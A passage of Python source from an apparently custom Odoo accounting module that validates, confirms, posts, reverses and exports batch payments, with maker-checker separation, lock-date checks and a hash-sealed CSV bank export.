                # currency. A company-currency journal may carry ordinary
                # Odoo payments in several currencies; the header converts
                # their totals to company currency for presentation.
                if (
                    journal.currency_id
                    and payment.currency_id != journal.currency_id
                ):
                    raise UserError(_(
                        "Payment %(payment)s currency must match the batch "
                        "journal currency %(currency)s.",
                        payment=payment.display_name,
                        currency=effective_currency.display_name,
                    ))
                payment_method = payment.payment_method_line_id
                if not payment_method or (
                    payment_method.journal_id != journal
                    or payment_method.payment_type != batch.batch_type
                    or (method and payment_method != method)
                ):
                    raise UserError(_(
                        "Payment %(payment)s method must match the batch "
                        "journal and direction.",
                        payment=payment.display_name,
                    ))
                expected_outstanding = (
                    payment._eh_expected_outstanding_account()
                )
                if (
                    not payment.outstanding_account_id
                    or payment.outstanding_account_id != expected_outstanding
                    or not _account_belongs_to_company(
                        payment.outstanding_account_id,
                        batch.company_id,
                    )
                ):
                    raise UserError(_(
                        "Payment %(payment)s outstanding account must be the "
                        "configured account %(account)s for its reviewed "
                        "payment method and company.",
                        payment=payment.display_name,
                        account=expected_outstanding.display_name,
                    ))
                expected_destination = (
                    payment._eh_expected_destination_account()
                )
                expected_account_type = (
                    'asset_receivable'
                    if payment.partner_type == 'customer'
                    else 'liability_payable'
                )
                if (
                    not payment.destination_account_id
                    or payment.destination_account_id != expected_destination
                    or not _account_belongs_to_company(
                        payment.destination_account_id,
                        batch.company_id,
                    )
                    or payment.destination_account_id.account_type
                    != expected_account_type
                    or not payment.destination_account_id.reconcile
                ):
                    raise UserError(_(
                        "Payment %(payment)s destination must be the exact "
                        "reconcilable %(account_type)s account carried by its "
                        "approved sources (or partner property when there are "
                        "no sources).",
                        payment=payment.display_name,
                        account_type=expected_account_type,
                    ))
                if require_postable and (
                    not payment.outstanding_account_id
                    or not payment.destination_account_id
                ):
                    raise UserError(_(
                        "Payment %(payment)s has no complete outstanding and "
                        "destination accounts, so posting would move no "
                        "cash. Configure the journal/payment accounts before "
                        "retrying.",
                        payment=payment.display_name,
                    ))
                if require_draft and not has_origin_payment_link:
                    payment._eh_assert_draft_move_semantics()

                sources = payment.eh_source_move_ids.sudo()
                core_invoices = payment._eh_core_invoice_moves()
                if core_invoices and (
                    set(core_invoices.ids) != set(sources.ids)
                ):
                    raise UserError(_(
                        "Payment %(payment)s has conflicting standard invoice "
                        "links and Settled documents. They must identify the "
                        "same source documents before the payment can join or "
                        "post with a batch.",
                        payment=payment.display_name,
                    ))
                directional_residual = 0.0
                for source in sources:
                    if source.company_id != batch.company_id:
                        raise UserError(_(
                            "Source %(source)s belongs to a different company "
                            "than batch %(batch)s.",
                            source=source.display_name,
                            batch=batch.display_name,
                        ))
                    if source.currency_id != payment.currency_id:
                        raise UserError(_(
                            "Source %(source)s currency does not match payment "
                            "%(payment)s. Mixed-currency batch settlement is "
                            "not supported without an explicit conversion.",
                            source=source.display_name,
                            payment=payment.display_name,
                        ))
                    if source.state != 'posted':
                        raise UserError(_(
                            "Source %(source)s must be posted before it can "
                            "be paid in a batch.",
                            source=source.display_name,
                        ))
                    if source.payment_state not in ('not_paid', 'partial'):
                        raise UserError(_(
                            "Source %(source)s is no longer unpaid or "
                            "partially paid (current payment state: "
                            "%(state)s).",
                            source=source.display_name,
                            state=source.payment_state,
                        ))
                    if source.move_type not in expected_move_types:
                        raise UserError(_(
                            "Source %(source)s does not match batch "
                            "%(batch)s direction.",
                            source=source.display_name,
                            batch=batch.display_name,
                        ))
                    if (
                        source.commercial_partner_id
                        != payment.partner_id.commercial_partner_id
                    ):
                        raise UserError(_(
                            "Source %(source)s partner does not match payment "
                            "%(payment)s.",
                            source=source.display_name,
                            payment=payment.display_name,
                        ))
                    settlement_lines = (
                        batch._eh_assert_source_settlement_lines(
                            payment, source,
                        )
                    )
                    duplicate_line_ids = (
                        batch_settlement_line_ids & set(settlement_lines.ids)
                    )
                    if duplicate_line_ids:
                        raise UserError(_(
                            "Batch %(batch)s contains duplicate source "
                            "settlement-line evidence across its payments.",
                            batch=batch.display_name,
                        ))
                    batch_settlement_line_ids.update(settlement_lines.ids)
                    residual = source.amount_residual
                    if source.move_type in ('out_refund', 'in_refund'):
                        residual = -residual
                    directional_residual += residual

                if sources and (
                    payment.currency_id.compare_amounts(
                        directional_residual, 0.0,
                    ) <= 0
                    or payment.currency_id.compare_amounts(
                        payment.amount, directional_residual,
                    ) > 0
                ):
                    raise UserError(_(
                        "Payment %(payment)s amount %(amount)s exceeds the "
                        "selected documents' positive net residual "
                        "%(residual)s. Reduce the partial payment or rebuild "
                        "the draft instruction before confirming it.",
                        payment=payment.display_name,
                        amount=payment.currency_id.format(payment.amount),
                        residual=payment.currency_id.format(
                            directional_residual,
                        ),
                    ))

                if sources:
                    claimed = Payment.search([
                        ('id', 'not in', payment.ids),
                        ('eh_source_move_ids', 'in', sources.ids),
                        ('eh_batch_payment_id', '!=', False),
                        ('eh_batch_payment_id.state', '!=', 'cancelled'),
                        ('state', '=', 'draft'),
                    ], limit=1)
                    if claimed:
                        duplicate_sources = (
                            claimed.eh_source_move_ids & sources
                        )
                        raise UserError(_(
                            "Source document(s) %(sources)s already have a "
                            "live draft batch-payment claim.",
                            sources=', '.join(
                                duplicate_sources.mapped('display_name'),
                            ),
                        ))
        return True

    # ---- transitions ----

    def action_confirm(self):
        self._eh_check_access('write')
        with self.env.cr.savepoint():
            return self._eh_action_confirm_locked()

    def _eh_action_confirm_locked(self):
        for batch in self:
            if not self.env.user.has_group(
                'eh_account_base.group_eh_manager',
            ):
                raise UserError(_(
                    "Only an EH Accounting Manager can confirm batch "
                    "payments.",
                ))
            batch._eh_lock_integrity_scope(include_batch_members=True)
            if batch.state != 'draft':
                raise UserError(_(
                    "Only draft batches can be confirmed.",
                ))
            batch._eh_validate_integrity(
                require_payments=True,
                require_draft=True,
            )
            if batch.export_file or batch.export_filename:
                raise UserError(_(
                    "This draft batch still carries a prior bank export. "
                    "Reset it through the workflow before confirming again."
                ))
            export_snapshot_json = batch._eh_build_export_snapshot()
            batch._eh_workflow_write({
                'state': 'confirmed',
                'export_snapshot_json': export_snapshot_json,
                'export_hash': False,
                'integrity_digest': batch._eh_compute_integrity_digest(
                    export_snapshot_json=export_snapshot_json,
                ),
                'integrity_quarantined': False,
                'confirmed_at': fields.Datetime.now(),
                'confirmed_by_id': self.env.user.id,
            })
        return True

    def action_post(self):
        self._eh_check_access('write')
        # The outer savepoint gives true all-or-nothing semantics even when a
        # custom caller catches our UserError instead of letting the HTTP
        # transaction roll back.  No successfully posted sibling is left
        # behind after a later member fails.
        with self.env.cr.savepoint():
            for batch in self:
                if not self.env.user.has_group(
                    'eh_account_base.group_eh_manager',
                ):
                    raise UserError(_(
                        "Only an EH Accounting Manager can post batch "
                        "payments.",
                    ))
                batch._eh_lock_integrity_scope(include_batch_members=True)
                if batch.state != 'confirmed':
                    raise UserError(_(
                        "Batch must be confirmed before it can be posted. "
                        "Confirm the batch first so the maker-checker "
                        "separation is respected.",
                    ))
                if not batch.confirmed_by_id:
                    raise UserError(_(
                        "Maker-checker separation: this batch has no verified "
                        "confirmer. Return it to draft and confirm it through "
                        "the Confirm action before posting.",
                    ))
                if batch.confirmed_by_id == self.env.user:
                    raise UserError(_(
                        "Maker-checker separation: the manager who confirmed "
                        "this batch cannot also post it. A different EH "
                        "Accounting Manager must post the batch.",
                    ))
                if batch.integrity_quarantined:
                    raise UserError(_(
                        "This legacy batch is quarantined because its prior "
                        "approval snapshot cannot be proven. Return it to "
                        "draft and confirm it again before posting."
                    ))
                batch._eh_validate_integrity(
                    require_payments=True,
                    require_draft=True,
                    require_postable=True,
                )
                batch._eh_assert_confirmation_digest()
                batch._check_period_lock_date()
                # Parse and render the approved rows before any cash move.
                # A missing/corrupt snapshot aborts the whole post instead of
                # leaving a posted batch whose bank instruction must be
                # reconstructed from mutable master data.
                export_content, export_filename = (
                    batch._eh_render_approved_export()
                )
                expected_source_remainders = {
                    payment.id: (
                        payment._eh_directional_source_residual()
                        - payment.amount
                    )
                    for payment in batch._eh_member_payments()
                    if payment.eh_source_move_ids
                }
                attempted = batch._post_payments()
                attempted.invalidate_recordset(['state', 'move_id'])
                posted_now = attempted.filtered(
                    batch._eh_is_complete_posted_payment,
                )
                if len(posted_now) != len(attempted):
                    raise UserError(_(
                        "Batch posting made no complete cash movement: every "
                        "member must have a posted journal entry.",
                    ))
                posted_now._eh_assert_posted_move_semantics()
                # The origin moves are permanent posted-batch evidence. The
                # suite seal freezes their financial lines while still
                # allowing ordinary partial-reconcile/bank matching fields.
                posted_now.move_id._eh_stamp_verified_seal()
                # Reconcile each freshly-posted payment against its documents
                # only after every cash movement succeeded.
                posted_now._eh_reconcile_sources()
                posted_now._eh_assert_sources_settled(
                    expected_source_remainders=expected_source_remainders,
                )
                export_hash = hashlib.sha256(export_content).hexdigest()
                batch._eh_workflow_write({
                    'state': 'posted',
                    'export_hash': export_hash,
                    'posted_at': fields.Datetime.now(),
                    'posted_by_id': self.env.user.id,
                })
                batch.sudo().with_context(
                    **{
                        AUTHORIZED_BATCH_EXPORT_CONTEXT:
                            AUTHORIZED_BATCH_EXPORT_CAPABILITY,
                    },
                ).write({
                    'export_file': base64.b64encode(export_content),
                    'export_filename': export_filename,
                })
        return True

    def action_cancel(self):
        self._eh_check_access('write')
        with self.env.cr.savepoint():
            return self._eh_action_cancel_locked()

    def _eh_action_cancel_locked(self):
        for batch in self:
            if not self.env.user.has_group(
                'eh_account_base.group_eh_manager',
            ):
                raise UserError(_(
                    "Only an EH Accounting Manager can cancel batch payments.",
                ))
            batch._eh_lock_integrity_scope(include_batch_members=True)
            if batch.state == 'posted':
                raise UserError(_(
                    "Posted batches cannot be cancelled or edited. Use an "
                    "authorized accounting reversal workflow for their "
                    "underlying payments.",
                ))
            if batch.state not in ('draft', 'confirmed'):
                raise UserError(_(
                    "Only a draft or confirmed batch can be cancelled.",
                ))
            if batch._eh_posted_member_moves():
                raise UserError(_(
                    "A batch containing posted member cash evidence cannot be "
                    "cancelled. Reverse that evidence through an authorized "
                    "accounting workflow."
                ))
            batch._eh_workflow_write({
                'state': 'cancelled',
                'cancelled_at': fields.Datetime.now(),
                'cancelled_by_id': self.env.user.id,
            })
        return True

    def action_reverse(self):
        """Reverse every posted cash move without deleting posted evidence."""
        self._eh_check_access('write')
        with self.env.cr.savepoint():
            for batch in self:
                if not self.env.user.has_group(
                    'eh_account_base.group_eh_manager',
                ):
                    raise UserError(_(
                        "Only an EH Accounting Manager can reverse batch "
                        "payments.",
                    ))
                batch._eh_lock_integrity_scope(include_batch_members=True)
                batch.invalidate_recordset([
                    'state', 'reversed_at', 'integrity_quarantined',
                ])
                if batch.state != 'posted':
                    raise UserError(_(
                        "Only a posted batch can be reversed.",
                    ))
                if batch.reversed_at:
                    raise UserError(_(
                        "This batch already has a controlled reversal.",
                    ))
                if batch.integrity_quarantined:
                    raise UserError(_(
                        "This legacy posted batch has no verified approval "
                        "snapshot. Preserve its quarantined evidence and "
                        "post a separately reviewed correction entry.",
                    ))
                members = batch._eh_member_payments()
                moves = batch._eh_posted_member_moves()
                if (
                    not members
                    or len(moves) != len(members)
                    or any(
                        not batch._eh_is_complete_posted_payment(payment)
                        for payment in members
                    )
                ):
                    raise UserError(_(
                        "Batch reversal requires one complete posted cash "
                        "move for every member payment.",
                    ))
                invalid_moves = moves.filtered(
                    lambda move: (
                        move.state != 'posted'
                        or not move.eh_sealed
                        or move.eh_legacy_unverified_seal
                    ),
                )
                if invalid_moves:
                    raise UserError(_(
                        "Batch reversal requires verified sealed originals. "
                        "Preserve legacy/unverified moves and post a "
                        "separately reviewed correction.",
                    ))
                existing = self.env['account.move'].sudo().search([
                    ('reversed_entry_id', 'in', moves.ids),
                ], limit=1)
                if existing:
                    raise UserError(_(
                        "A member cash move already has a reversal. Review "
                        "that immutable trail instead of reversing again.",
                    ))
                reversal_date = fields.Date.context_today(batch)
                reversal_values = []
                for move in moves:
                    reversal_values.append({
                        'date': reversal_date,
                        'ref': _(
                            "Reversal of batch %(batch)s / %(move)s",
                            batch=batch.display_name,
                            move=move.name or move.display_name,
                        ),
                    })
                capable = moves.sudo(False).with_context(**{
                    AUTHORIZED_BATCH_REVERSAL_CONTEXT:
                        AUTHORIZED_BATCH_REVERSAL_CAPABILITY,
                    AUTHORIZED_BATCH_RECONCILE_CONTEXT:
                        AUTHORIZED_BATCH_RECONCILE_CAPABILITY,
                })
                reversals = capable._eh_reverse_with_verified_capability(
                    reversal_values,
                    cancel=True,
                )
                if (
                    len(reversals) != len(moves)
                    or any(
                        reversal.state != 'posted'
                        or not reversal.eh_sealed
                        or reversal.reversed_entry_id not in moves
                        for reversal in reversals
                    )
                ):
                    raise UserError(_(
                        "Batch reversal did not produce one verified posted "
                        "counter-entry for every cash move.",
                    ))
                batch._eh_workflow_write({
                    'reversed_at': fields.Datetime.now(),
                    'reversed_by_id': self.env.user.id,
                })
                batch.message_post(body=_(
                    "Every member cash move was reversed through verified "
                    "counter-entries. Original posted evidence was retained.",
                ))
        return True

    def action_set_to_draft(self):
        self._eh_check_access('write')
        with self.env.cr.savepoint():
            return self._eh_action_set_to_draft_locked()

    def _eh_action_set_to_draft_locked(self):
        for batch in self:
            if not self.env.user.has_group(
                'eh_account_base.group_eh_manager',
            ):
                raise UserError(_(
                    "Only an EH Accounting Manager can reset batch payments.",
                ))
            batch._eh_lock_integrity_scope(include_batch_members=True)
            members = batch._eh_member_payments()
            if batch._eh_posted_member_moves():
                raise UserError(_(
                    "A batch containing posted member cash evidence cannot be "
                    "reset or have its audit fields cleared."
                ))
            is_stuck_empty_posted = (
                batch.state == 'posted'
                and all(
                    payment.state == 'draft'
                    and (
                        not payment.move_id
                        or payment.move_id.state == 'draft'
                    )
                    for payment in members
                )
            )
            if batch.state != 'cancelled' and not is_stuck_empty_posted:
                raise UserError(_(
                    "Only cancelled batches, or a posted batch with no "
                    "posted payments, can return to draft.",
                ))
            batch._eh_workflow_write({
                'state': 'draft',
                'integrity_digest': False,
                'integrity_quarantined': False,
                'export_snapshot_json': False,
                'export_hash': False,
                'confirmed_at': False,
                'confirmed_by_id': False,
                'posted_at': False,
                'posted_by_id': False,
                'cancelled_at': False,
                'cancelled_by_id': False,
            })
            batch.sudo().with_context(
                **{
                    AUTHORIZED_BATCH_EXPORT_CONTEXT:
                        AUTHORIZED_BATCH_EXPORT_CAPABILITY,
                },
            ).write({
                'export_file': False,
                'export_filename': False,
            })
        return True

    def _eh_posted_member_moves(self):
        """Return canonical/direct moves carrying durable cash evidence."""
        self.ensure_one()
        members = self._eh_member_payments()
        if not members:
            return self.env['account.move']
        Move = self.env['account.move'].sudo()
        owner_field = (
            'origin_payment_id'
            if 'origin_payment_id' in Move._fields
            else 'payment_id'
        )
        canonical = members.mapped('move_id').filtered(
            lambda move: (
                move.state == 'posted'
                or move.posted_before
                or move.eh_sealed
                or move.eh_legacy_unverified_seal
            ),
        )
        direct = Move.search([
            (owner_field, 'in', members.ids),
        ], order='id').filtered(
            lambda move: (
                move.state == 'posted'
                or move.posted_before
                or move.eh_sealed
                or move.eh_legacy_unverified_seal
            ),
        )
        return canonical | direct

    def action_open_build_wizard(self):
        self.ensure_one()
        self._eh_check_access('read')
        return {
            'type': 'ir.actions.act_window',
            'name': _("Add payments to batch"),
            'res_model': 'eh.batch.payment.build.wizard',
            'view_mode': 'form',
            'views': [(False, 'form')],
            'target': 'new',
            'context': {'default_batch_id': self.id},
        }

    def action_view_payments(self):
        self.ensure_one()
        self._eh_check_access('read')
        return {
            'type': 'ir.actions.act_window',
            'name': _("Payments in batch %s") % self.name,
            'res_model': 'account.payment',
            'view_mode': 'list,form',
            'views': [(False, 'list'), (False, 'form')],
            'domain': [('eh_batch_payment_id', '=', self.id)],
            'context': {'default_eh_batch_payment_id': self.id},
        }

    def action_view_posted_payments(self):
        self.ensure_one()
        action = self.action_view_payments()
        action.update({
            'name': _("Posted payments in batch %s") % self.name,
            'domain': action['domain'] + [
                ('state', 'in', list(POSTED_STATES)),
            ],
        })
        return action

    def action_view_reconciled_payments(self):
        self.ensure_one()
        action = self.action_view_payments()
        action.update({
            'name': _("Reconciled payments in batch %s") % self.name,
            'domain': action['domain'] + [
                ('is_reconciled', '=', True),
            ],
        })
        return action

    # ---- lock-date guard ----

    def _period_lock_date(self):
        """Return the actor-specific fiscal/hard lock for this batch.

        The modern resolver honours active soft-lock exceptions for this user
        and journal while retaining the absolute hard lock. Odoo 16/17 expose
        the same helper without a journal argument; older series without the
        helper use the strongest available company field directly.
        """
        self.ensure_one()
        company = self.company_id or self.env.company
        Company = self.env['res.company']
        # Respect BOTH the fiscal-year lock and the hard lock (Odoo 17.4+):
        # the hard lock is an irreversible close, so a batch dated on or
        # before it must be refused just like the fiscal-year lock. Field
        # presence is guarded so the module stays importable on any series.
        get_user_lock = getattr(company, '_get_user_fiscal_lock_date', None)
        if get_user_lock:
            # Odoo 18+ accepts the journal so active lock exceptions can be
            # resolved precisely. Odoo 16/17 expose a no-argument variant.
            # Only use the legacy fallback when that call itself succeeds;
            # an internal TypeError from either implementation must surface.
            try:
                return get_user_lock(self.journal_id)
            except TypeError as journal_signature_error:
                try:
                    return get_user_lock()
                except TypeError:
                    raise journal_signature_error
        candidates = []
        for fname in ('fiscalyear_lock_date', 'hard_lock_date'):
            if fname in Company._fields:
                val = company.sudo()[fname]
                if val:
                    candidates.append(val)
        return max(candidates) if candidates else None

    def _check_period_lock_date(self):
        """Refuse to post a batch dated on or before the company's fiscal
        lock date.

        Every member payment is stamped with the batch's payment_date at
        build time, so a batch dated into a locked period would book its
        journal entries into a closed period. The standard account.move
        lock-date check would raise per payment, but the batch swallows
        per-payment failures into chatter via savepoints, so a locked
        period silently strands the whole batch instead of giving the
        manager one clear message. Guard here, up front, before any
        payment is touched. Active core lock exceptions are honoured on
        series that expose the user-specific lock-date resolver.

        Opt-in-safe: only blocks when a lock date is genuinely set.
        With no lock date configured, prior behaviour is preserved.
        """
        self.ensure_one()
        lock_date = self._period_lock_date()
        if not lock_date:
            return
        # The authoritative booking dates are the member payments' own dates,
        # which can diverge from the batch header date. Block if ANY member
        # payment (or the header date when there are no members yet) would
        # book on or before the lock date.
        member_dates = self._eh_member_payments().filtered('date').mapped(
            'date',
        )
        candidate_dates = member_dates or [
            self.payment_date or fields.Date.context_today(self)]
        locked = [d for d in candidate_dates if d <= lock_date]
        if locked:
            raise UserError(_(
                "Cannot post this batch: a payment dated %(date)s falls on "
                "or before the accounting lock date %(lock)s. Change the "
                "payment date to a period that is still open, or ask an "
                "administrator to move the lock date.",
                date=fields.Date.to_string(min(locked)),
                lock=fields.Date.to_string(lock_date),
            ))

    # ---- posting helper ----

    def _eh_is_complete_posted_payment(self, payment):
        """Validate core payment-move identity across supported series."""
        if (
            payment.state not in POSTED_STATES
            or not payment.move_id
            or payment.move_id.state != 'posted'
        ):
            return False
        if 'origin_payment_id' in payment.move_id._fields:
            return payment.move_id.origin_payment_id == payment
        # Odoo 16/17 delegate account.payment to its required move_id; that
        # identity is authoritative because origin_payment_id starts in 18.
        return True

    def _post_payments(self):
        """Post every member and reject partial/no-op outcomes.

        Individual savepoints let us report all immediately failing members;
        ``action_post`` owns an outer savepoint which rolls back every success
        if this helper raises.
        """
        self.ensure_one()
        failed = []
        attempted = self._eh_member_payments()
        if not attempted:
            raise UserError(_("Cannot post an empty batch."))
        for payment in attempted:
            try:
                with self.env.cr.savepoint():
                    # Sanctioned batch posting is the only bypass of the
                    # confirmed-member financial freeze. sudo() preserves the
                    # acting checker in env.user for audit provenance.
                    payment.sudo().with_context(**{
                        AUTHORIZED_BATCH_POST_CONTEXT:
                            AUTHORIZED_BATCH_POST_CAPABILITY,
                    }).action_post()
                    payment.invalidate_recordset(['state', 'move_id'])
                    if not self._eh_is_complete_posted_payment(payment):
                        raise UserError(_(
                            "Payment did not create a posted journal entry.",
                        ))
            except Exception as exc:  # noqa: BLE001
                failed.append((payment, str(exc)))
        if failed:
            details = '; '.join(
                "%s: %s" % (payment.display_name, error)
                for payment, error in failed[:5]
            )
            raise UserError(_(
                "Batch posting aborted; %(failed)d of %(total)d payment(s) "
                "failed. No payment was kept posted. %(details)s",
                failed=len(failed),
                total=len(attempted),
                details=details,
            ))
        return attempted

    # ---- export ----

    def action_preview_csv(self):
        """Download the exact confirmation snapshot before cash is posted."""
        self.ensure_one()
        self._eh_check_access('read')
        if not self.env.user.has_group(
            'eh_account_base.group_eh_manager',
        ):
            raise UserError(_(
                "Only an EH Accounting Manager can preview batch payment "
                "bank details.",
            ))
        with self.env.cr.savepoint():
            self._eh_lock_integrity_scope(include_batch_members=True)
            if self.state != 'confirmed':
                raise UserError(_(
                    "A bank-file preview is available only after the maker "
                    "has confirmed and frozen the batch.",
                ))
            self._eh_validate_integrity(
                require_payments=True,
                require_draft=True,
            )
            self._eh_assert_confirmation_digest()
            _content, filename = self._eh_render_approved_export()
        query = urlencode({
            'download': 'true',
            'filename': filename,
        })
        return {
            'type': 'ir.actions.act_url',
            'url': '/web/content/%s/%s/preview_export_file?%s' % (
                self._name, self.id, query,
            ),
            'target': 'download',
        }

    def action_export_csv(self):
        """Export the batch contents to a CSV attachment.

        The payload mirrors the wire format common SMB bank portals
        accept: a row per payment with the partner name, the partner
        bank account if known, the amount, the currency, and the
        reference. Banks that need a different layout subclass and
        override _export_csv_rows.
        """
        self.ensure_one()
        self._eh_check_access('write')
        if not self.env.user.has_group(
            'eh_account_base.group_eh_manager',
        ):
            raise UserError(_(
                "Only an EH Accounting Manager can export batch payment "
                "bank details.",
            ))
        with self.env.cr.savepoint():
            return self._eh_action_export_csv_locked()

    def _eh_action_export_csv_locked(self):
        self._eh_lock_integrity_scope(include_batch_members=True)
        if self.state != 'posted':
            raise UserError(_(
                "The immutable bank export is available only after a "
                "different manager has posted the confirmed batch.",
            ))
        if self.integrity_quarantined or not self.integrity_digest:
            raise UserError(_(
                "This legacy posted batch has no provable approval snapshot. "
                "Its existing evidence is preserved, but a new bank export "
                "cannot be generated."
            ))
        payments = self._eh_member_payments()
        if not payments or any(
            not self._eh_is_complete_posted_payment(payment)
            for payment in payments
        ):
            raise UserError(_(
                "This batch has no complete posted payment evidence and "
                "cannot produce a bank export.",
            ))
        if not self.export_file or not self.export_filename or not self.export_hash:
            raise UserError(_(
                "This posted batch has no bank file sealed by its posting "
                "transaction. It cannot be reconstructed from current "
                "partner or bank-account data."
            ))
        # Reading the Binary invokes the attachment byte-boundary hash check.
        self._eh_verify_export_content()
        filename = self.export_filename
        query = urlencode({
            'download': 'true',
            'filename': filename,
        })
        return {
            'type': 'ir.actions.act_url',
            'url': '/web/content/%s/%s/export_file?%s' % (
                self._name, self.id, query,
            ),
            'target': 'download',
        }

    def _eh_build_export_snapshot(self):
        """Serialize the exact manager-reviewed CSV rows at confirmation."""
        self.ensure_one()
        return json.dumps(
            self._export_csv_rows(),
            ensure_ascii=False,
            separators=(',', ':'),
        )

    def _eh_render_approved_export(self):
        """Return bytes/filename from the sealed confirmation snapshot."""
        self.ensure_one()
        try:
            rows = json.loads(self.export_snapshot_json or '')
        except (TypeError, ValueError) as exc:
            raise UserError(_(
                "The approved bank-export snapshot is missing or malformed. "
                "No payment was posted."
            )) from exc
        expected_header = [
            'Reference', 'Partner', 'Bank account', 'Amount',
            'Currency', 'Payment date', 'Memo',
        ]
        if (
            not isinstance(rows, list)
            or not rows
            or rows[0] != expected_header
            or len(rows) != len(self._eh_member_payments()) + 1
            or any(
                not isinstance(row, list)
                or len(row) != len(expected_header)
                or any(not isinstance(cell, str) for cell in row)
                for row in rows
            )
        ):
            raise UserError(_(
                "The approved bank-export snapshot has an invalid shape. "
                "No payment was posted."
            ))
        if any(not row[0].strip() for row in rows[1:]):
            raise UserError(_(
                "The approved bank-export snapshot contains a payment "
                "without a stable Reference. Cancel and reset this batch to "
                "draft, then confirm it again before posting."
            ))
        buf = io.StringIO()
        csv.writer(buf).writerows(rows)
        return (
            buf.getvalue().encode('utf-8'),
            _safe_export_filename(self.name, self.id),
        )

    def _eh_verify_export_content(self, attachment=None, content=None):
        """Verify the exact bank-file bytes about to be read or served."""
        self.ensure_one()
        if self.state != 'posted' or self.integrity_quarantined:
            raise UserError(_(
                "This batch has no active, provable bank export."
            ))
        if attachment is None:
            attachment = self.env['ir.attachment'].sudo().with_context(
                skip_res_field_check=True,
            ).search([
                ('res_model', '=', self._name),
                ('res_id', '=', self.id),
                ('res_field', '=', 'export_file'),
            ], limit=1)
        if not attachment or (
            attachment.res_model != self._name
            or attachment.res_id != self.id
            or attachment.res_field != 'export_file'
        ):
            raise UserError(_(
                "The posted bank export is missing or mislinked."
            ))
        if content is None:
            content = attachment.sudo().raw or b''
        if isinstance(content, bytearray):
            content = bytes(content)
        if not isinstance(content, bytes):
            raise UserError(_("The posted bank export is not a byte stream."))
        actual_hash = hashlib.sha256(content).hexdigest()
        if not self.export_hash or not hmac.compare_digest(
            self.export_hash,
            actual_hash,
        ):
            raise UserError(_(
                "The stored bank export no longer matches its SHA-256 audit "
                "fingerprint. Download was blocked."
            ))
        return content

    def _export_csv_rows(self):
        self.ensure_one()
        rows = [
            ['Reference', 'Partner', 'Bank account', 'Amount',
             'Currency', 'Payment date', 'Memo'],
        ]
        for payment in self._eh_member_payments().sorted('partner_id'):
            partner = payment.partner_id
            bank = (
                payment.partner_bank_id.acc_number
                if payment.partner_bank_id
                else ''
            )
            # Free-form, lower-trust text columns are neutralised against
            # spreadsheet formula injection. The amount ("%.2f") and the
            # ISO date are machine-formatted and must stay parseable, so
            # they are written raw.
            currency = payment.currency_id
            rounded_amount = currency.round(payment.amount)
            decimal_places = currency.decimal_places
            rows.append([
                _safe_csv_cell(self._eh_export_payment_reference(payment)),
                _safe_csv_cell(partner.display_name if partner else ''),
                _safe_csv_cell(bank or ''),
                ("%%.%df" % decimal_places) % rounded_amount,
                _safe_csv_cell(
                    payment.currency_id.name if payment.currency_id else '',
                ),
                payment.date.isoformat() if payment.date else '',
                _safe_csv_cell(_payment_memo(payment)),
            ])
        return rows

    def _eh_export_payment_reference(self, payment):
        """Return stable review-time evidence without consuming a sequence.

        Modern Odoo assigns the payment journal-entry number only when the
        draft payment posts.  The bank rows are deliberately sealed earlier,
        at confirmation, so ``payment.name`` cannot be their reference. Prefer
        an explicit bank reference, then the selected source documents or memo,
        and finally a deterministic batch/member key for manually-added rows.
        """
        self.ensure_one()
        source_reference = ', '.join(filter(None, (
            move.name or move.ref or ''
            for move in payment.eh_source_move_ids.sorted('id')
        )))[:200]
        return (
            payment.payment_reference
            or source_reference
            or _payment_memo(payment)
            or "%s/%s" % (self.name or 'batch', payment.id)
        )
